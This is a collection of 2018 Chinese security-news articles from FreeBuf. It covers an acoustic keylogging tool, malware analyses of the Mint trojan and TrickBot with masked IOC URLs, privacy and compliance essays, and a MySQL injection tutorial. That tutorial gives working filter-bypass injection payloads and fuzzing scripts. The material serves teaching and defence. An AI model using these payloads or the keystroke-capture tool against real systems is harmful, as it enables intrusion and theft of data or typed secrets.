secist,,2018-12-18,"前言kbd-audio项目是一系列用于捕获和分析音频数据的命令行和GUI工具的集合。其中我认为最有意思的一款工具是keytap，它可以通过麦克风来捕获和分析键盘的输入，从而猜测出按键内容。有关keytap的更多信息，可以参阅以下博文及演示视频：Keytap: description and some random thoughts构建说明相关依赖SDL2 – 用于捕获音频和打开GUI windows libsdlFFTW3 – 一些辅助工具执行傅里叶变换（Fourier Transformation）fftwLinux &amp; Mac OSgit clone https://github.com/ggerganov/kbd-audiocd kbd-audiogit submodule update --initmkdir build &amp;&amp; cd buildcmake ..makeWindows(todo, PRs welcome)工具集record-full将音频录制到磁盘上的原始二进制文件./record-full output.kbdplay-full播放通过record-full捕获的录制内容./play-full input.kbdrecord仅在键入时录制音频。用于收集keytap的训练数据./record output.kbdplay播放通过record创建的录制内容./play input.kbdkeytap通过麦克风音频实时检测并捕获按下的键。使用record捕获的训练数据。./keytap-gui input0.kbd [input1.kbd] [input2.kbd] ...Live demo（需要启用WebAssembly pthreads和SharedArrayBuffer）keytap2（正在开发中）通过麦克风音频实时检测并捕获按下的键。使用关于语言的统计信息（n-gram频率）。无需训练数据。recording.kbd输入文件必须通过record-full生成，并包含将要分析的音频数据。n-gram.txt文件必须包含相应语言的n-gram概率。./keytap2-gui recording.kbd n-gram.txt反馈如果你对该工具有任何的疑问或建议，欢迎在此处留下你的评论。 *参考来源：GitHub，FB小编secist编译，转载请注明来自FreeBuf.COM",kbd-audio：通过麦克风来捕获和分析键盘输入的工具
GEETEST极验,,2018-12-17,"前言过去一年，数据泄漏事件频发，从外卖app、快递到酒店，详细到姓名、手机号码、地址、开房记录的信息，强烈的刺激着公众的神经。而随着我们迈入大数据时代，指纹、面部特征、语音也被纳入信息收集及盗取利用的范畴。在今年1月份，印度10亿公民身份数据库Aadhaar被曝遭网络攻击，该数据库除了名字、电话号码、邮箱地址等之外还有指纹、虹膜记录（虹膜识别技术是基于眼睛中的虹膜进行身份识别）等极度敏感的信息。这些比你的身份证还全面、精确的数据，若被别有用心的人加以利用，后果极为严重。在这样的一个大数据时代，我们的数据与隐私该何去何从呢。一、隐私数据被过度收集上周，中消协对100款App开展了隐私政策测评工作。结果显示，多达91款App存在涉嫌过度收集或使用用户信息的问题。1. 基本信息被过度收集企业出于“多多益善”的心态，对用户数据持续越位抓取，修图App要获取你的地理位置，购物App需开启录音权限，非游戏类APP越位获取访问联系人权限。当然，他们也会征求你的同意，可一旦你拒绝了这些请求，就不能使用该App，可以说是相当霸道。只有唯一“同意协议”选项的隐私政策2. 社交数据被大量收集你在不断创造新的数据。百度搜索资料，高德地图上查找地址、路线，微信聊天创造了文字记录，淘宝购物留下了交易数据。系统再根据这些海量数据，了解性格偏好，形成人物画像。我们自己看自己时还会存在偏差，但数据不会骗人，最后系统会比你自己还懂你。某app隐私协议二、数据的商业化应用数据被收集后，不愁没有用武之地。企业对数据最常见的有三种用途：一是精准营销，优化广告推荐。二是作为研究样本。人工智能研究需要大量数据，美颜app的人像照片，可作为人脸识别样本；语音聊天内容，构成声纹识别的样本。三是跟第三方营销推广平台合作，通过提供、贩卖数据赚钱；常见的如，你用浏览器A搜索猫粮的内容，之后登陆电商平台B，马上就会出现猫粮的购买推荐。就是因为A浏览器将你的数据提供给了B平台。某app隐私协议至于转让、贩卖信息，可以最近一直在舆论风口的Facebook为例来看。上半年Facebook被爆出，将部分数据转让给“剑桥分析公司”，而该公司通过研究推文“点赞”，了解用户偏好，为政治选举提供建议，并曾帮助特朗普赢取美国大选。且据外媒最新消息，内部文件显示，Facebook确实曾考虑将用户的隐私数据对第三方进行销售。至于不重视用户隐私有多大影响呢，Facebook股价18.96%的下跌给企业们一个参考。三、黑产对数据的盗取和贩卖对于黑产来说，大型互联网公司就是一顿肥美的大餐,他们想尽办法去攻破其数据库。目前主要的数据盗取途径包括：内部员工泄漏、黑客入侵数据库、恶意爬虫等，另外，淘宝卖家，快递点，也是信息泄漏的高频区域。信贷公司、诈骗集团、薅羊毛的黑产人员是这些信息主要买家。在暗网上，有众多明码实价售卖的隐私信息数据包，为了隐蔽性一般以比特币为交易货币，而隐私数据也极其廉价，数亿的详细个人数据往往只需要40万人民币左右。由于学籍信息泄漏去年6月发生的“徐玉玉”案还没多，今年7月份暗网又有了“浙江省1000万条学籍信息”，如此精准、详细的信息被诈骗人员掌握，意味着我们面临的骗局会越来越难以识破。四、AI时代的隐私战“数据商业化”和“隐私保护”注定是一场愈演愈烈的战争，随着AI技术的发展这场战争可能会进入白热化阶段。1. 无死角通信监听据斯诺登披露的“棱镜门项目”描述，美国政府正面向大众，展开一个无差别的监视项目。斯洛登向公众披露，NSA（美国国家安全局）在全球建了很多信息拦截点，只要在拦截范围内的信息就会被自动提取通讯内容，包括通话记录、邮件内容、银行卡号甚至密码。而且该系统可以预先设置关键词，在未来匹配到对象时候，就能立即搜索目标，这相当于监控警报。2. 智能家居的潜在陷阱智能家居和伴学机器人如今越来越火，而它们在方便你的同时，也将你的大量隐私至于危险境地。联网的家居清楚记录你的作息时间，机器人帮你监督孩子学习的同时，也可能帮助黑客监控着你的家庭，届时，你的家可能也不再是一个完全安全、放松的场所。3. “天网”恢恢，疏而不漏最近亚马逊正在给警方推销系统Rekognition——亚马逊产品介绍资料显示，Rekognition可以监控“团体照片、拥挤人群以及机场等公共场所中的所有面孔”，也就是可以帮助警方跟踪任何一个人。不难想象，当无人机、卫星和街边摄像头组成的天眼系统，与人脸识别技术结合后，电影《黑镜》中描绘的政府可以实时监控任何人的情境也不远了。五、拒绝“隐私换便利”虽然我们确实会进入一个越来越“没有隐私”的时代，也有可能“从没有人会去阅读冗长的用户协议”，但“隐私换便利”的论断无疑是伪命题。隐私是一项基本的人权，无论是对企业、个人还是政府，都应该重视它。1. 政府隐私法规的健全对于隐私数据被贪婪不加节制的获取，政府已经采取行动。6月1日新出台的《网络安全法》，首批打击目标就是黑客、数据交易公司，互联网公司“内鬼”。根据最高法、最高检的司法解释，“非法获取、出售或者提供行踪轨迹信息、通信内容、征信信息、财产信息50条以上”，即属情节严重，可入刑。相信通过行政性的惩罚，可以警示企业去审视自己的行为，防止此类行为的再次出现。2. 企业对数据的保护一方面企业对用户隐私的态度应更加审慎，严格按照《个人信息安全规范》规定，对个人信息的收集应有明确目的，不得超出产品功能相关目的；另一方面，对于已有数据应该做好安全加密工作，从用户登陆到后台数据库层层防护，对异常情况及时监控，确保数据不被非法盗取。对数据和商业贪婪的克制，可能更利于和用户培养信任感，实现长线的收获。3. 个人对数据的态度与信息安全最密切相关的还是个人，目前我们对信息的重视程度不够。最基本的在使用应用前阅读隐私条款，对各类从产品的安全性时刻保持警惕，有甚者可以学习下加密技术，不要因为科技的发展，丢掉了自己的自由。*本文作者：GEETEST极验，转载请注明来自FreeBuf.COM",10亿公民指纹泄漏、亚马逊人脸跟踪系统上线，2018隐私保护告急
Freddy,,2018-12-14,前言2018年，5G标准、中芯案件，使得技术博弈、话语权博弈持续发酵，深刻改变着数字经济的利益格局和安全格局。GDPR落地已经半年有余，我国《网络安全法》也正式实施一年了，全球范围内围绕网络安全、数据保护等重要制度立法、执法和司法活动都在积极推动。但是一部分企业在合规过程中往往被一叶障目，以为合规了数据就安全了，真的是这样吗？概述企业中的开发部门和网络安全部门的责任划分、目标和动机有着很大的不同，不可避免地会产生诸多冲突。在新应用、新功能的开发过程中，企业一般通过引入代码扫描工具来确保安全，以便在上线之前发现漏洞并进行修复。但是随着企业合规需求的不断上升，对于一些企业而言，网络安全建设的重心转向了如何满足法律法规的监管，这就有可能出现本末倒置引发的问题。这里举一个来自于电子支付领域的典型例子。对于存储了用户财产信息的支付系统来说，应当以确保所在目标系统和数据的机密性、完整性和可用性为前提。但是合规性需求一来，对于质量安全评估员（QSA）而言获得支付卡行业数据安全标准（PCI-DSS）认证就变成最高优先级事件了。比如2008年Heartland支付系统数据泄露的例子，虽然有点老，但是说明的问题很典型。就是到了现在，它还是有史以来最大的数据泄漏事件之一，当年超过1亿人的个人信息和支付卡数据被盗，超过600家公司受到影响，损失总额达数亿美元。Heartland符合PCI-DSS，在发现违规行为的两周前刚刚通过合规审计。造成该事件的原因是攻击者通过SQL注入漏洞成功渗透到系统内部，并非是零日攻击或APT。漏洞所在模块是用于处理支付卡数据，因此不在PCI QSA的审核范围内。合规与安全建设合规计划与安全建设应当作为两条轨道同时进行，合规计划不应管理安全计划的运作。任何行业标准下的要求应当作为组织的安全底线，而不是终极目标。合规团队的目标是满足最低安全标准，这些标准由第三方定义，不会考虑每个企业的独特业务背景，只是推进某种业务功能而不是强制保证全面安全。那么，企业开发流程中的安全建设该如何适应？每个开发生命周期都必须根据业务需求、开发节奏和使用的技术进行自定义设计，以下五点可以作为参考：一、光扫描是不够的，还需要持续跟踪和修正要提升开发流程安全性，光扫描和报告漏洞是不够的，必须要有能够在整个开发周期中进行全面安全管理的一套工具/系统，支持提供以下信息：有关开放漏洞的最新统计数据；统计数据的时间窗口；漏洞的历史趋势；安全缺陷密度统计和趋势。该工具应当支持集成基础架构漏洞管理报告，让高级管理人员明确了解整体风险，并了解具体针对哪些领域。二、推进SDLC中的安全流程标准化标准化保证每个开发阶段安全性的必要条件。针对软件开发生命周期（SDLC）而言，团队是否遵循每年一次的大规模部署的瀑布流程，或者包含持续集成/持续部署通道，这些因素并不是最重要的。每个人都知道会进行安全测试，比如静态分析/检测并修复任何已识别的漏洞。所以要注意的一点是，SDLC还必须包括安全维护这一环节。一旦推向生产环节，项目往往会冻结，有时候开发人员不会参与下一个版本的工作。在源代码中发现新漏洞时该怎么办？必须有一个持续的版本维护流程来确保安全。三、使用经过验证的技术基于知名和成熟的技术来构建标准化的安全流程可以让安全团队更加专注和专业。分析师熟悉语言语法能够协助开发人员，针对特定语言和版本定制自动化工具。建立第三方库和框架的索引可以更方便地进行管理，在发生问题时快速急行补救，并可降低使用流氓库的可能性。四、上下一心如果高层管理人员三心二意，那么就算是世界上最好的安全计划也无计可施，安全团队要向管理人员和利益相关方传达安全开发流程的好处，能够带来哪些绩效上的提升。五、开发人员教育在开发时引入漏洞是源代码出现问题的根源，相当一部分比例的计算机科学专业毕业生从未接触过最基本的安全实践准则或原则。要解决这个问题需要在安全发展计划中纳入继续教育这一块的内容而且应当是从全面的安全基础教育开始，而不是那种蜻蜓点水式的培训。形式上可以是午餐会、学习小组、现场活动等，当他们深入了解代码阶段引入的各种问题让安全团队多么头大时，代码质量就会相应提升。*参考来源：darkreading，Freddy编译整理，转载请注明来自 FreeBuf.COM。,合规就代表安全了吗？那可不一定
安全豹,,2018-12-12,0×1 前言近期，金山毒霸安全实验室通过“捕风”威胁感知系统的数据监控，发现一款名为“西瓜看图”的恶意软件。该软件主要通过“荒野行动电脑版”、“抖音电脑版”等虚假下载器进行传播。该虚假器运行后，实际安装的是“蜻蜓助手”安卓模拟器，并由“蜻蜓助手”推广安装“西瓜看图”木马远控软件。该软件通过云控手段，进行主页劫持、图标推广、软件推广、广告弹窗等恶意行为。由于该木马会在用户磁盘中创建“Mint”的目录，保存云控插件，所以我们特此命名为“Mint”木马。0×2 传播和推广Mint木马的传播路径：虚假下载器运行界面：该虚假下载器无签名，无版本信息，点击“立即安装”会下载运行“蜻蜓助手”，而不是用户预想的“荒野行动网易版”。“蜻蜓助手”安装完毕后，会默认勾选“西瓜看图”（Mint木马家族的母体），用户如稍有不慎点击“立即启动”就会被植入木马软件。0×3 模块和流程功能模块Mint 云控木马主要为6个功能：信息收集，广告弹窗，软件推广，图标推广，主页劫持，更新变异。其中，广告弹窗，软件推广，图标推广和主页劫持的具体内容，均由云端进行配置，通过下发文件的形式，在本地解析执行；更新变异，则保证云控载体不断更新和变形，以躲避杀软查杀和更新功能。功能模块图：信息收集，主页劫持，广告等相关URL信息：执行流程Mint木马利用傀儡进程注入、BHO机制（参考https://en.wikipedia.org/wiki/Browser_Helper_Object）、UPX加壳、数据加密、服务劫持等技术，使整个执行过程具有很高的隐蔽性。执行流程：0×4 影响和分布通过“捕风”威胁感知系统的监控到，Mint木马家族8月中旬开始爆发；9月中旬活跃达到峰值，感染用户量达5W/天；10月之后活跃降低，近期又逐渐活跃起来。受感染的用户中，占比最多的是1123变种（71.23%），其次是1122变种（17.11%）（因为变种众多，为了方便起见，我们暂且用文件名后面的版本号表示变种名称。如url包含的文件名XiGuaViewer_1123.exe，表示1123变种）变种分布图：0×5 细节分析环境检测Mint母体通过注册表、文件和进程关系，检测是否沙箱/虚拟机/调试/杀软环境，是否浏览器或下载器启动；不是的话才执行恶意代码，否则只调起安装界面。沙箱/虚拟机环境检测：调试工具和安全监控软件的检测名单：配置下拉云控载体解密模块配置文件Ver.ini：获取到解密后的内容：整理出模块配置文件Ver.ini各字段的含义如下：接着云控载体进行字段解析并更新插件模块和推广配置文件，将核心模块core.dat解密并注入到傀儡进程中执行：核心模块core.dat会解密推广配置文件settings.xml，并执行相应的推广劫持操作：更新变异云控载体从模块配置文件Ver.ini中获取最新载体的下载地址（http://down.om*******.com/Lsvr.dat），保存为PsLangue.dat，然后解密还原成PE文件，复制到系统目录下，随机命名，并通过劫持wuauserv系统服务的方式，实现自更新和启动。主页劫持（1）首先，Mint母体（“西瓜看图”）下载http://plg.*******.com/plg.dat，并执行；plg.dat 从资源中释放两个dll（分别是32位和64位），用regsvr32.exe注册dll文件。通过BHO机制劫持IE浏览器主页为http://uee.me/q8gn（跳转后最终为2345网址导航）。通过BHO机制劫持IE浏览器主页为http://uee.me/q8gn（跳转后最终为2345网址导航）。（2）其次，在core.dat核心功能模块中，通过修改注册表的方式篡改用户主页：settings.xml中篡改页的配置信息：图标推广settings.xml中图标推广的配置信息：广告弹窗settings.xml中广告弹窗的配置信息：软件推广settings.xml中软件推广的部分配置信息：我们发现，在配置文件中，主页篡改、图标推广、广告弹窗和软件推广，除规避“北上深广”一线城市外，还规避了昆山和马鞍山。其他由于Mint木马家族变种繁多，部分云控模块已停用，且由于篇幅和时间所限，这就不多啰嗦啦。0×6 安全建议不安装来源不明的可疑软件；默认勾选框千万千万千万要小心；安装杀毒防护软件并开启主防功能；定时查杀和更新系统。附录IOC087E97C0A106A4184E61E743664F87649FFA36F6B4F2690490851E25390A07B80BA931AE318DC6F02D1D660D6A2202AE7AC1413CC61E997C4FF65E7262D3D173F9BA5281CF00E096B608C1825C1D60CC73192ADE5AA1569BE1FD5A9C4758003A98A9C4A108E10E758861600EB1F6F511D4667E997D50A4DFECBF2C9E4884E4359486BBBF6A9DE9CF2BE8C75347AE32F935BE3B8495074A4CBAE724572FA90ED431C3581C6094E043F4D2492D099977171DCBB119B1BA07F7718E9E31D014C817B493D07BF7857E4851356016DAD13BCA439EE7F2493D7B453442AC31AA3C5DCD16181EA5452F547430E1426AE9027D04http://down.tw******.cn/XiGuaViewer_1121.exehttp://down.vx******.com/XGViewer_1093.exehttp://down.wi******.com/XiGuaViewer_1133.exehttp://mo.******.net/mo/setup.cr173.386472.exehttp://coll.******.com:9804/supp.aspxhttp://ver.******.com/Ver.inihttp://cfg.******.com/config.inihttp://down.om******.com/Lcore.dathttp://down.om******.com/Hcore.dathttp://down.om******.com/Lsvr.dathttp://down.om******.com/Hsvr.dathttp://down.um******.com/Discontor32.xmlhttp://down.um******.com/Discontor64.xmlhttp://plg.******.com/PopNews.dat参考链接BHO：https://en.wikipedia.org/wiki/Browser_Helper_Object*本文作者：安全豹，转载请注明来自FreeBuf.COM,Mint木马变种泛滥，伪装“抖音电脑版”肆虐网络
Alpha_h4ck,,2018-12-10,前言Trickbot这款银行木马涉及到了多种网络攻击活动，但它主要针对的是银行机构的网络系统。但是现在，TrickBot的更新版本将能够针对自助提款服务以及POS机设备来发动攻击，并窃取目标用户的储蓄卡及信用卡支付数据。概述近期，TrickBot的恶意活动变得越来越频繁了，而且它还可以攻击类似Microsoft Outlook、Chrome、Firefox、IE和Edge等浏览器或者App，并从中窃取用户密码和其他的敏感数据。除此之外，这款恶意软件的开发者仍在持续给TrickBot增加新的功能，比如说引入更强大的代码注入技术来绕过安全检测，引入反分析技术并禁止目标计算机运行安全工具。目前识别到的TrickBot样本已经支持POS服务攻击功能了。这个新添加的POS感染模块名为psfin32，它的作用跟此前攻击所使用的网络域名收集模块非常类似。研究人员在分析过程中发现，模块代码中包含了跟POS相关的术语，而且代码使用了LDAP查询请求来访问活动目录服务（ADS）并识别目标网络中的POS服务。LDAP查询&amp;TrickBot感染过程TrickBot主要使用LDAP查询来在Global Catalog中搜索包含了下列子字符串（跟POS服务相关）的设备：*POS**LANE* *BOH* *TERM**REG* *STORE* *ALOHA* *CASH* *RETAIL* *MICROS*它使用了不同的LDAP查询来搜索这些子字符串，如果查询请求无法获取到预期的响应信息，也就是查询结果，那么它将会查询其他的账号或者对象。当Trickbot从目标设备上获取到了所需信息之后，它将会把数据存储在预配置文件中，并通过POST链接将收集到的数据传回远程C2服务器。如果C2服务器无法访问，它将会返回“Dpost servers unavailable”，否则它将会发送“Report successfully sent”。因此，研究人员提醒广大企业及用户，不要打开任何可疑邮件以及附件文档，以防止受到此类攻击的威胁。* 参考来源：gbhackers，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM,升级版TrickBot将支持获取信用卡储蓄卡数据的功能
lifeisaloop,,2018-12-07,之前，日本新晋网络安全部长樱田义孝表示自己从来没用过电脑，甚至连USB是什么都无法解释清楚，引起日本国内一片哗然，也让吃瓜群众掩面而笑。本站也发布过一篇报道，笔者摘取部分内容回顾一下。作为现任的网络安全部长，樱田义孝在11月14日日本国内答辩现场的回答却让人震惊：电脑相关的操作我一般都指示职员来做，所以自己并没有用过电脑。问到关于USB的问题时：他的回答：他的回答：不过毕竟这是别国的内政，我们作为群众也只能看看热闹，但是美国人似乎要抬一把国际政治舞台上一直充当美国马前卒的日本。。。根据国际知名科技站点TechCrunch贴出来的一则小故事，看得出特朗普的网络安全顾问其实也不怎么懂网络安全。最近纽约市前任市长、特朗普总统现任网络安全顾问鲁迪·朱利安尼（Rudy Giuliani）也被打上了“不懂的技术政治人物”的标签。朱利安尼在一条推文里忘了在句号后面加空格，而上下句的首尾单词恰好连成了一个批评特朗普的网站 。这本来已经很尴尬了，不过，他现在又声称“Twitter 让某个人在我的文本中插入了一则令人厌恶的反总统信息”，这着实让他的网络智商在大家眼中跌成了负数。搞不清楚眼前状况的朱利安尼抓住了一根救命稻草，即声称 Twitter 内部存在明显的反共和党偏见——特朗普和其他共和党人经常拿着个说事 ，尽管他们毫无证据 。“他们（Twitter 员工）不是职业川黑就鬼了。”朱利安尼补充道。Twitter让某个人在我的文本中插入了一则令人厌恶的反总统信息。我后来还有一次句号之后没加空格就没出这种事。他们不是铁杆特朗普反对者就鬼了。《时代》杂志也差不多。请保持公正！！— Rudy Giuliani (@RudyGiuliani) 2018年11月5日这个解释倒是简单。我们在这里再次重申，他现在的职务是白宫网络安全顾问。穆勒提出控诉趁着总统参加 G-20. 在 7 月份的时候，他也曾在总统前往赫尔辛基之前起诉那些永远不会来到这里的俄罗斯人。早一点或晚一点都可以起诉啊，简直是失控了！快来个人管管，好吗？— Rudy Giuliani (@RudyGiuliani) 2018年11月30日朱利安尼最初在 11 月 30 日发布的推文（如上）没有在句子之间加上空格，从而创建了一个指向G-20.in的超链接。一位眼尖的群众——据BBC报道，他是一位驻亚特兰大的营销总监，名叫杰森·维拉兹克（Jason Velazquez）——点进了链接，并且发现它是空白的，于是他很快注册了这个域名，并创建了一个网站，在上面写上了朱利安尼所说的“一则令人厌恶的反总统信息”。「特朗普是美奸卖国贼」：出现在朱利安尼推文中的 G-20.in 网站。“当我意识到那个网址还可用的时候，我的心跳开始加速。我记得当时心想：‘这个家伙，朱利安尼，根本不懂是咋回事。’”委拉斯开兹在接受 BBC 采访时说，“我迅速上传了文件，在 Twitter 上公布了自己做的事，然后离开了我的公寓。”朱利安尼最初的推文被媒体广泛报道，但他对这个话题做出的荒谬回应又让该网站得到了更多的媒体曝光。截至太平洋标准时间 12 月 4 日 22 时 40 分，朱利安尼的两条推文仍然没有被删除。不过，从积极的一面来说，朱利安尼似乎搞清楚了如何通过回复之前的推文在 Twitter 上进行跟帖。在此之前，朱利安尼也曾上演过另一幕 Twitter 喜剧，他对自己一则关于特朗普前任律师迈克尔·科恩（Michael Cohen）达成认罪协议的推文进行了跟帖，但内容却很奇怪（如下）：Kimim ° has f— Rudy Giuliani (@RudyGiuliani) 2018年11月30日这则推文跟特朗普在去年发出的“covfefe”拼写错误倒是相映成趣。*本文转载自techcrunch.cn，lifeisaloop整理，转载请注明来源。,白宫网络安全顾问：听说日本网安部长没用过电脑，不知道USB是什么，你们以为我就懂网络安全了？
Zzzxbug,,2018-12-06,"*本文原创作者：Zzzxbug，本文属FreeBuf原创奖励计划，未经许可禁止转载对于mysql的注入，基本上是每一名web安全从业者入门的基本功，这里不多废话，结合本人无聊时在mysql上的测试，来谈一谈mysql在过滤某些特殊字符情况下的注入，因为是想到哪写到哪，文章比较散，各位大佬请绕过，和我一样的小白可以看一看，温故而知新，必有所获。php查询mysql的后台脚本就不搭了，没有多大意义，直接从mysql控制台开始测试。首先从最简单的开始：直接使用mysql系统库做测试：我们假设在user后存在注入点：那么在利用order by获得列数后进行union注入：我们假设在user后存在注入点：那么在利用order by获得列数后进行union注入：现在开始增加难度,假设后端代码过滤了空格，我们可以替换空格的方法很多：/**/，0x0a,0x0b,0x0c,0x0d:上图使用/**/替换空格上图使用0x0a号字符替换空格，注意:按住alt键+小键盘输入10再松开alt键即可在控制台中输入ascii字符0x0a上图使用0x0a号字符替换空格，注意:按住alt键+小键盘输入10再松开alt键即可在控制台中输入ascii字符0x0a上图使用0x0b号字符替换空格，注意:按住alt键+小键盘输入11再松开alt键即可在控制台中输入ascii字符0x0b上图使用0x0b号字符替换空格，注意:按住alt键+小键盘输入11再松开alt键即可在控制台中输入ascii字符0x0b上图使用0x0c号字符替换空格，注意:按住alt键+小键盘输入12再松开alt键即可在控制台中输入ascii字符0x0c上图使用0x0c号字符替换空格，注意:按住alt键+小键盘输入12再松开alt键即可在控制台中输入ascii字符0x0c上图使用0x0d号字符替换空格，注意:按住alt键+小键盘输入13再松开alt键即可在控制台中输入ascii字符0x0d,但因为在控制台中一旦输入0x0d，就会执行指令，所以这里只在union前输入了一次。上图使用0x0d号字符替换空格，注意:按住alt键+小键盘输入13再松开alt键即可在控制台中输入ascii字符0x0d,但因为在控制台中一旦输入0x0d，就会执行指令，所以这里只在union前输入了一次。做到这里我们可能会想，除了这些字符外还有没有其它字符可以替换空格呢，我们fuzz一下：&lt;?php$mysqli = new mysqli('localhost', 'root', '', 'mysql');if ($mysqli-&gt;connect_errno) {    die(""could not connect to the database:\n"" . $mysqli-&gt;connect_error);}$i=0;while($i++&lt;256){    $sql = ""select host,user from user where user='a'"".chr($i).""union"".chr($i).""select 1,2;"";    $res = $mysqli-&gt;query($sql);    if ($res) {        echo ""Ok!:$i:"".chr($i).""&lt;br&gt;"";    }    }$mysqli-&gt;close();?&gt;将以上代码存为1.php,放入apache中网页访问，显示结果：可以发现，除了我们刚刚使用的0x0a,0x0b,0x0c,0x0d外还有9号与160号字符可以替换空格（32号本身就是空格，35是注释符不能查询获得正确结果，9号是tab，刚刚漏了，至于160号字符为什么行，我也不知道，那位哥如果知道可以告诉大家)。可以发现，除了我们刚刚使用的0x0a,0x0b,0x0c,0x0d外还有9号与160号字符可以替换空格（32号本身就是空格，35是注释符不能查询获得正确结果，9号是tab，刚刚漏了，至于160号字符为什么行，我也不知道，那位哥如果知道可以告诉大家)。进一步思考：如果这些字符都被过滤了，有没有办法不依靠空格来注入呢，办法还是有的，看下面的语句：在这个语句中： 在这个语句中： select host,user from user where user='a'union(select`table_name`,`table_type`from`information_schema`.`tables`);利用了括号、反引号来隔离了sql关键词与库名表名列名，完成了注入。接下来继续提高难度，我们的注入语句中有许多逗号，看了让人不爽，如果把逗号也过滤掉，我们有没有办法注入呢，方法还是有的，我们可以结合join语句和子查询的别名来替换逗号，看下面的语句：在这个语句中，我们利用join与别名，成功的避免使用逗号实现了注入：在这个语句中，我们利用join与别名，成功的避免使用逗号实现了注入：select host,user from user where user='a'union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`='mysql')`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`='mysql')b));玩到这里，我脑洞忽然大开：mysql的子查询别名是可以无限嵌套的么，像俄罗斯套娃一样，下面的语句可以无限扩展么，会不会出现溢出呢：为了验证，我又进行了一次fuzz，将下面的代码存为2.php，放入apache中网页访问：为了验证，我又进行了一次fuzz，将下面的代码存为2.php，放入apache中网页访问：&lt;?php$mysqli = new mysqli('localhost', 'root', '', 'mysql');if ($mysqli-&gt;connect_errno) {    die(""could not connect to the database:\n"" . $mysqli-&gt;connect_error);}$i=1;$sql = ""select'1'"";while($i++){    $alias='a'.""$i"";    $sql = ""select*from("".$sql."")$alias"";    $res = $mysqli-&gt;query($sql);    if(!$res){        echo $mysqli-&gt;error;        break;    }else{        echo $sql.""&lt;br&gt;"";    }}$mysqli-&gt;close();?&gt;结果如下：select*from(select'1')a2select*from(select*from(select'1')a2)a3select*from(select*from(select*from(select'1')a2)a3)a4select*from(select*from(select*from(select*from(select'1')a2)a3)a4)a5。。。。。。select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select'1')a2)a3)a4)a5)a6)a7)a8)a9)a10)a11)a12)a13)a14)a15)a16)a17)a18)a19)a20)a21)a22)a23)a24)a25)a26)a27)a28)a29)a30)a31)a32)a33)a34)a35)a36)a37)a38)a39)a40)a41)a42)a43)a44)a45)a46)a47)a48)a49)a50)a51)a52)a53)a54)a55)a56)a57)a58)a59)a60)a61)a62)a63)a64Too high level of nesting for select 可以看到在嵌套64次后，mysql输出了”Too high level of nesting for select”的错误信息，也就是说我们最多用mysql进行嵌套子查询64层。继续回到正题上，再来看刚刚的语句：select host,user from user where user='a'union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`='mysql')`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`='mysql')b));在库名、表名、列名不带空格、*、{、}等特殊符号的情况下（我猜想反引号的存在本来就是为了这类特殊库名表名列名准备的），语句中的反引号也可以用括号代替，变成下面的语句，这样即使过滤了反引号也可以实现注入：select host,user from user where user='a'union(select*from(((select(table_name)from(information_schema.tables)where(table_schema)='mysql')a)join(select(table_type)from(information_schema.tables)where(table_schema)='mysql')b));如果存在宽字节注入，那么即使过滤了单引号，我们也可以注入，这时语句变成这样：select host,user from user where user='a?'union(select*from(((select(table_name)from(information_schema.tables)where(table_schema)=0x6D7973716C)a)join(select(table_type)from(information_schema.tables)where(table_schema)=0x6D7973716C)b));在注入点处使用宽字节绕过\,将后面的数据处替换成十六进制，来避免了单引号。其他技巧：某些web应用只取查询结果的第一行，这时可以使用group_concat()来获取完整数据,例如：select host,user from user where user='a?'union(select*from(((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=0x6D7973716C)a)join(select(table_type)from(information_schema.tables)where(table_schema)=0x6D7973716C)b));也可以多加几个条件判断来逐行获取所要的数据：select host,user from user where user='a?'union(select*from(((select(table_name)from(information_schema.tables)where(table_schema)=(0x6D7973716C)and(table_name)!=(0x6462)and(table_name)!=(0x67687478).......)a)join(select(0x77)from(information_schema.tables)where(table_schema)=0x6D7973716C)b));*本文原创作者：Zzzxbug，本文属FreeBuf原创奖励计划，未经许可禁止转载",SQL注入测试技巧TIP：再从Mysql注入绕过过滤说起
FB客服,,2018-12-04,安全防护与攻击是一对矛盾体，几乎同时出现，一起发展，但安全防护总是滞后于攻击手段。近年来，网络攻击行为呈现以下趋势：攻击成本降低，攻击技术复杂化，攻击方式多样化。同时，攻击产业链日趋成熟，攻击行为危害更大，防护难度更高，尤其是针对企业的攻击活动大有从个人行为转变为有组织、有预谋的网络犯罪团的趋势。随着“互联网+”和“工业4.0”等国家战略的全面铺开，大大推动了企业的数字化转型。在这个过程中，应接不暇的网络攻击手段给企业安全运营造成了重大挑战，传统安全设备和安全解决方案在对抗各类不对等攻击，如APT、数据窃取、勒索软件、社会工程学攻击等更是见效甚微。此外，随着基于人工智能技术构建的攻击模型不断投入到针对企业的恶意网络活动中，一些恶意软件也可以通过机器学习技术来对抗安全软件，如此一来大大扩展了攻击链、提高了攻击效率。在这样的新时代背景下，针对企业的网络攻击面不断扩大，从数字化领域逐渐扩展到物理世界，将对企业的运营、业务、生产、产品和客户等产生更广泛、更深远的影响。要对抗APT等复杂攻击手段和人工智能技术武装下的攻击模型，需要通过使用类似于人工智能等新兴技术来不断提升防御技术的能力。但是对于企业尤其是中小企业的网络安全建设者来说，一方面普遍存在网络安全管理人才储备缺失、技术力量薄弱、防护手段单一等条件限制问题 ，另一方面又困惑于如何在有效抵御新型网络威胁时保证ROI，提升投入产出比。面对网络安全建设对于企业运营的掣肘时，企业该如何实现安全能力创新、解决安全痛点，通过安全赋能业务？FIT 